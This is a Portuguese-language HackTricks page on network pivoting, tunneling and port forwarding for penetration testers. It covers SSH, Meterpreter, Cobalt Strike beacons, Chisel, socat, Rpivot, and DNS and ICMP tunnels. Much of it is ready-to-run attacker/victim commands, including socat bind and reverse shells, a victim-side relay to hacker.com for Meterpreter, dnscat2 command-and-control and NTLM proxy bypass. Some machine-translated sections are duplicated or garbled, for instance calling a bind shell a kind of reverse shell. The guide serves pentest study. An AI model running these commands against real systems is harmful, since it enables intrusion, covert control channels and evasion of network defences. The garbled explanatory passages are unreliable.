# Tunelamento e Encaminhamento de Porta

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Dica do Nmap

{% hint style="warning" %}
Os scans **ICMP** e **SYN** não podem ser tunelados através de proxies socks, então devemos **desativar a descoberta de ping** (`-Pn`) e especificar **scans TCP** (`-sT`) para que isso funcione.
{% endhint %}

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Conexão gráfica SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Porta Local2Local

Abrir nova porta no servidor SSH --> Outra porta
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Porta2Porta

Porta local --> Host comprometido (SSH) --> Terceira\_caixa:Porta
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host 
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Porta Local --> Host comprometido (SSH) --> Qualquer lugar
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Encaminhamento de Porta Reverso

Isso é útil para obter shells reversos de hosts internos através de uma DMZ para o seu host:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems 
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Você precisa de **root em ambos os dispositivos** (já que você vai criar novas interfaces) e a configuração do sshd deve permitir login de root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Ative o encaminhamento no lado do servidor
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Defina uma nova rota no lado do cliente
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Você pode **tunelar** todo o **tráfego** para uma **sub-rede** através de um host usando **ssh**.\
Por exemplo, encaminhando todo o tráfego destinado a 10.10.10.0/24.
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
# Conectar com uma chave privada

Para se conectar a um servidor remoto usando uma chave privada, você pode usar o seguinte comando:

```
ssh -i /path/to/private_key user@host
```

Substitua `/path/to/private_key` pelo caminho para a sua chave privada, `user` pelo nome de usuário do servidor remoto e `host` pelo endereço IP ou nome de domínio do servidor remoto.

Se você não especificar o caminho para a chave privada, o SSH usará a chave padrão `~/.ssh/id_rsa`.

Certifique-se de que a chave privada tenha permissões restritas (600) para evitar que outras pessoas acessem sua chave.
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Porta a Porta

Porta local --> Host comprometido (sessão ativa) --> Terceira\_caixa:Porta
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS

SOCKS é um protocolo de rede que permite o encaminhamento de tráfego de rede entre um cliente e um servidor através de um proxy. O SOCKS pode ser usado para criar um túnel seguro entre um cliente e um servidor, permitindo que o tráfego de rede seja criptografado e protegido contra interceptação. O SOCKS é frequentemente usado para contornar restrições de rede, como firewalls, e para acessar recursos restritos em uma rede. O SOCKS pode ser configurado em vários aplicativos, como navegadores da web e clientes de e-mail, para permitir o acesso a recursos restritos em uma rede.
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Outra maneira:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### Proxy SOCKS

Abra uma porta no teamserver ouvindo em todas as interfaces que podem ser usadas para **rotear o tráfego através do beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
Neste caso, a **porta é aberta no host beacon**, não no Team Server e o tráfego é enviado para o Team Server e, a partir daí, para o host:porta indicado.
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Observação:

* O encaminhamento de porta reversa do Beacon sempre direciona o tráfego para o Servidor da Equipe e o Servidor da Equipe envia o tráfego para o destino pretendido, portanto, não deve ser usado para transmitir tráfego entre máquinas individuais.
* O tráfego é tunelado dentro do tráfego C2 do Beacon, não em soquetes separados, e também funciona em links P2P.
* Você não precisa ser um administrador local para criar encaminhamentos de porta reversa em portas altas.

### rPort2Port local

{% hint style="warning" %}
Neste caso, a porta é aberta no host do Beacon, não no Servidor da Equipe e o tráfego é enviado para o cliente Cobalt Strike (não para o Servidor da Equipe) e a partir daí para o host:porta indicado.
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Você precisa fazer o upload de um túnel de arquivo web: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Você pode baixá-lo na página de lançamentos de [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Você precisa usar a **mesma versão para cliente e servidor**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Encaminhamento de porta

---

#### Introduction

#### Introdução

Port forwarding is a technique that allows us to access a service running on a specific port of a remote machine, as if that service was running on our local machine. This technique is very useful when we need to access a service that is not directly accessible from our machine due to network restrictions or firewall rules.

O encaminhamento de porta é uma técnica que nos permite acessar um serviço em execução em uma porta específica de uma máquina remota, como se esse serviço estivesse em execução em nossa máquina local. Essa técnica é muito útil quando precisamos acessar um serviço que não é diretamente acessível a partir de nossa máquina devido a restrições de rede ou regras de firewall.

#### Local port forwarding

#### Encaminhamento de porta local

Local port forwarding allows us to forward traffic from a local port to a remote machine, through an SSH connection. This technique is useful when we need to access a service running on a remote machine that is not directly accessible from our local machine.

O encaminhamento de porta local nos permite encaminhar o tráfego de uma porta local para uma máquina remota, por meio de uma conexão SSH. Essa técnica é útil quando precisamos acessar um serviço em execução em uma máquina remota que não é diretamente acessível a partir de nossa máquina local.

To perform local port forwarding, we need to use the following command:

Para realizar o encaminhamento de porta local, precisamos usar o seguinte comando:

```
ssh -L <local_port>:<remote_host>:<remote_port> <user>@<ssh_server>
```

Where:

Onde:

- `<local_port>` is the local port we want to forward traffic from.

- `<remote_host>` is the remote machine we want to forward traffic to.

- `<remote_port>` is the port on the remote machine we want to forward traffic to.

- `<user>` is the username we want to use to connect to the SSH server.

- `<ssh_server>` is the SSH server we want to connect to.

- `<local_port>` é a porta local da qual queremos encaminhar o tráfego.

- `<remote_host>` é a máquina remota para a qual queremos encaminhar o tráfego.

- `<remote_port>` é a porta na máquina remota para a qual queremos encaminhar o tráfego.

- `<user>` é o nome de usuário que queremos usar para se conectar ao servidor SSH.

- `<ssh_server>` é o servidor SSH ao qual queremos nos conectar.

For example, if we want to access a web server running on port 80 of a remote machine with IP address `192.168.1.100`, we can use the following command:

Por exemplo, se quisermos acessar um servidor web em execução na porta 80 de uma máquina remota com o endereço IP `192.168.1.100`, podemos usar o seguinte comando:

```
ssh -L 8080:192.168.1.100:80 user@ssh_server
```

This command will forward traffic from port `8080` of our local machine to port `80` of the remote machine with IP address `192.168.1.100`, through an SSH connection to the SSH server.

Este comando encaminhará o tráfego da porta `8080` de nossa máquina local para a porta `80` da máquina remota com o endereço IP `192.168.1.100`, por meio de uma conexão SSH com o servidor SSH.

To access the web server, we can open a web browser and navigate to `http://localhost:8080`.

Para acessar o servidor web, podemos abrir um navegador da web e navegar até `http://localhost:8080`.

#### Remote port forwarding

#### Encaminhamento de porta remoto

Remote port forwarding allows us to forward traffic from a remote port to a local machine, through an SSH connection. This technique is useful when we need to expose a service running on our local machine to a remote machine.

O encaminhamento de porta remoto nos permite encaminhar o tráfego de uma porta remota para uma máquina local, por meio de uma conexão SSH. Essa técnica é útil quando precisamos expor um serviço em execução em nossa máquina local para uma máquina remota.

To perform remote port forwarding, we need to use the following command:

Para realizar o encaminhamento de porta remoto, precisamos usar o seguinte comando:

```
ssh -R <remote_port>:<local_host>:<local_port> <user>@<ssh_server>
```

Where:

Onde:

- `<remote_port>` is the remote port we want to forward traffic from.

- `<local_host>` is the local machine we want to forward traffic to.

- `<local_port>` is the port on the local machine we want to forward traffic to.

- `<user>` is the username we want to use to connect to the SSH server.

- `<ssh_server>` is the SSH server we want to connect to.

- `<remote_port>` é a porta remota da qual queremos encaminhar o tráfego.

- `<local_host>` é a máquina local para a qual queremos encaminhar o tráfego.

- `<local_port>` é a porta na máquina local para a qual queremos encaminhar o tráfego.

- `<user>` é o nome de usuário que queremos usar para se conectar ao servidor SSH.

- `<ssh_server>` é o servidor SSH ao qual queremos nos conectar.

For example, if we want to expose a web server running on port 80 of our local machine to a remote machine with IP address `192.168.1.100`, we can use the following command:

Por exemplo, se quisermos expor um servidor web em execução na porta 80 de nossa máquina local para uma máquina remota com o endereço IP `192.168.1.100`, podemos usar o seguinte comando:

```
ssh -R 8080:localhost:80 user@ssh_server
```

This command will forward traffic from port `80` of our local machine to port `8080` of the remote machine with IP address `192.168.1.100`, through an SSH connection to the SSH server.

Este comando encaminhará o tráfego da porta `80` de nossa máquina local para a porta `8080` da máquina remota com o endereço IP `192.168.1.100`, por meio de uma conexão SSH com o servidor SSH.

To access the web server, we can open a web browser on the remote machine and navigate to `http://localhost:8080`.

Para acessar o servidor web, podemos abrir um navegador da web na máquina remota e navegar até `http://localhost:8080`.
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Túnel reverso. O túnel é iniciado a partir da vítima.\
Um proxy socks4 é criado em 127.0.0.1:1080.
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivotar através de um proxy **NTLM**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Shell de Bind

Um shell de bind é um tipo de shell reverso que permite que um invasor se conecte a uma porta específica em um sistema comprometido e obtenha uma shell interativa. O socat pode ser usado para criar um shell de bind em um sistema comprometido. Para criar um shell de bind, execute o seguinte comando no sistema comprometido:

```
socat TCP-L:<port> EXEC:/bin/bash
```

Substitua `<port>` pela porta que você deseja usar para se conectar ao shell de bind. Depois de executar o comando, o socat aguardará uma conexão na porta especificada e, quando uma conexão for estabelecida, ele executará um shell interativo.
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Shell reverso
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Porta a Porta
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Porta a porta através de socks

#### Introdução

Às vezes, precisamos acessar um serviço que está em uma rede que não podemos alcançar diretamente. Nesses casos, podemos usar um túnel para acessar o serviço. Um tipo de túnel é o túnel de porta a porta, que permite que um serviço em uma máquina remota seja acessado localmente através de uma porta local.

#### Requisitos

- Um servidor SSH com acesso à rede remota.
- Um cliente SSH com suporte a SOCKS.

#### Procedimento

1. Conecte-se ao servidor SSH com a opção `-D` para habilitar o servidor SOCKS:

   ```
   ssh -D 1080 user@server
   ```

2. Configure o cliente para usar o servidor SOCKS. Isso pode ser feito nas configurações de rede do sistema ou nas configurações do aplicativo.

3. Crie um túnel de porta a porta para o serviço remoto:

   ```
   ssh -L 8080:remote-service:80 user@server
   ```

   Isso criará um túnel de porta a porta entre a porta local `8080` e a porta `80` do serviço remoto.

4. Acesse o serviço localmente através da porta local `8080`.

#### Exemplo

Suponha que temos um serviço web em `remote-service:80` que não podemos acessar diretamente. Podemos criar um túnel de porta a porta para acessá-lo localmente através da porta `8080`:

```
ssh -D 1080 user@server
```

Configure o navegador para usar o servidor SOCKS em `localhost:1080`.

```
ssh -L 8080:remote-service:80 user@server
```

Acesse o serviço em `localhost:8080`.
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter através do SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Você pode burlar um **proxy não autenticado** executando esta linha em vez da última no console da vítima:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
### Túnel SSL Socat

**Console /bin/sh**

Crie certificados em ambos os lados: Cliente e Servidor.
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Porta-a-Porta Remoto

Conecte a porta SSH local (22) à porta 443 do host do atacante.
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost 
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22 
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

É como uma versão de console do PuTTY (as opções são muito semelhantes a um cliente ssh).

Como este binário será executado na vítima e é um cliente ssh, precisamos abrir nosso serviço ssh e porta para que possamos ter uma conexão reversa. Em seguida, para encaminhar apenas a porta acessível localmente para uma porta em nossa máquina:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Porta a Porta

Você precisa ser um administrador local (para qualquer porta)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444 
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Você precisa ter **acesso RDP ao sistema**.\
Download:

1. [Binários SocksOverRDP x64](https://github.com/nccgroup/SocksOverRDP/releases) - Esta ferramenta usa `Dynamic Virtual Channels` (`DVC`) do recurso de Serviço de Área de Trabalho Remota do Windows. O DVC é responsável por **tunelar pacotes sobre a conexão RDP**.
2. [Binário Portátil do Proxifier](https://www.proxifier.com/download/#win-tab)

No seu computador cliente, carregue **`SocksOverRDP-Plugin.dll`** assim:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Agora podemos nos **conectar** à **vítima** por meio do **RDP** usando o **`mstsc.exe`**, e devemos receber um **prompt** informando que o **plugin SocksOverRDP está habilitado**, e ele irá **escutar** na porta **127.0.0.1:1080**.

**Conecte** via **RDP** e faça o upload e execute na máquina da vítima o binário **`SocksOverRDP-Server.exe`**:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Agora, confirme em sua máquina (atacante) que a porta 1080 está ouvindo:
```
netstat -antb | findstr 1080
```
Agora você pode usar o [**Proxifier**](https://www.proxifier.com/) **para encaminhar o tráfego por meio daquela porta.**

## Proxificar aplicativos GUI do Windows

Você pode fazer com que aplicativos GUI do Windows naveguem por meio de um proxy usando o [**Proxifier**](https://www.proxifier.com/).\
Em **Profile -> Proxy Servers**, adicione o IP e a porta do servidor SOCKS.\
Em **Profile -> Proxification Rules**, adicione o nome do programa para proxificar e as conexões para os IPs que você deseja proxificar.

## Bypass de proxy NTLM

A ferramenta mencionada anteriormente: **Rpivot**\
**OpenVPN** também pode ignorá-lo, configurando essas opções no arquivo de configuração:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Ele autentica contra um proxy e vincula uma porta local que é encaminhada para o serviço externo que você especificar. Em seguida, você pode usar a ferramenta de sua escolha por meio desta porta.\
Por exemplo, encaminha a porta 443.
```
Username Alice 
Password P@ssw0rd 
Domain CONTOSO.COM 
Proxy 10.0.0.10:8080 
Tunnel 2222:<attackers_machine>:443
```
Agora, se você definir, por exemplo, no sistema da vítima o serviço **SSH** para ouvir na porta 443. Você pode se conectar a ele por meio da porta 2222 do atacante.\
Você também pode usar um **meterpreter** que se conecta a localhost:443 e o atacante está ouvindo na porta 2222.

## YARP

Um proxy reverso criado pela Microsoft. Você pode encontrá-lo aqui: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

O root é necessário em ambos os sistemas para criar adaptadores tun e tunelar dados entre eles usando consultas DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
O túnel será muito lento. Você pode criar uma conexão SSH comprimida através deste túnel usando:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

****[**Baixe-o aqui**](https://github.com/iagox86/dnscat2)**.**

Estabelece um canal C\&C através do DNS. Não precisa de privilégios de root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **No PowerShell**

Você pode usar o [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) para executar um cliente dnscat2 no PowerShell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd 
```
#### **Encaminhamento de porta com dnscat**

O `dnscat` é uma ferramenta que permite o encaminhamento de tráfego através de consultas DNS. Isso pode ser útil em cenários em que o tráfego é restrito a apenas algumas portas, como em firewalls ou em redes restritas. 

Para usar o `dnscat`, é necessário ter um servidor DNS configurado para responder a consultas para um determinado domínio. Em seguida, é possível usar o `dnscat` para enviar tráfego para esse domínio, que será encaminhado para o servidor DNS e, em seguida, para o destino final.

Para configurar o `dnscat`, é necessário executar um servidor no lado do servidor e um cliente no lado do cliente. O servidor pode ser executado em qualquer máquina com um servidor DNS configurado, enquanto o cliente pode ser executado em qualquer máquina com acesso à Internet.

Para encaminhar uma porta específica, é necessário configurar o servidor DNS para responder a consultas para um subdomínio específico e, em seguida, usar o `dnscat` para enviar tráfego para esse subdomínio. O tráfego será encaminhado para a porta especificada no servidor DNS e, em seguida, para o destino final.

O `dnscat` também suporta a compressão de dados, o que pode ser útil para reduzir o tamanho do tráfego enviado através de consultas DNS. No entanto, isso pode aumentar a carga de processamento no lado do servidor DNS, portanto, é importante equilibrar a compressão com a carga de processamento.
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Alterar o DNS do proxychains

O Proxychains intercepta a chamada libc `gethostbyname` e encaminha a solicitação tcp DNS através do proxy socks. Por **padrão**, o servidor **DNS** que o proxychains usa é **4.2.2.2** (codificado). Para alterá-lo, edite o arquivo: _/usr/lib/proxychains3/proxyresolv_ e altere o IP. Se você estiver em um ambiente **Windows**, poderá definir o IP do **controlador de domínio**.

## Túneis em Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

O root é necessário em ambos os sistemas para criar adaptadores tun e tunelar dados entre eles usando solicitações de eco ICMP.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

****[**Baixe-o aqui**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh 

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) é uma ferramenta para expor soluções na Internet em uma única linha de comando.**  
*As URIs de exposição são como:* **UID.ngrok.io**

### Instalação

- Crie uma conta: https://ngrok.com/signup
- Download do cliente:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Usos básicos

**Documentação:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*Também é possível adicionar autenticação e TLS, se necessário.*

#### Tunelamento TCP
```bash
# Pointing to 0.0.0.0:4444 
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Expondo arquivos com HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing de chamadas HTTP

*Útil para XSS, SSRF, SSTI ...*  
Diretamente do stdout ou na interface HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunelando serviço HTTP interno
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Exemplo de configuração simples do ngrok.yaml

Ele abre 3 túneis:
- 2 TCP
- 1 HTTP com exposição de arquivos estáticos de /tmp/httpbin/
```yaml
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```
## Outras ferramentas para verificar

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
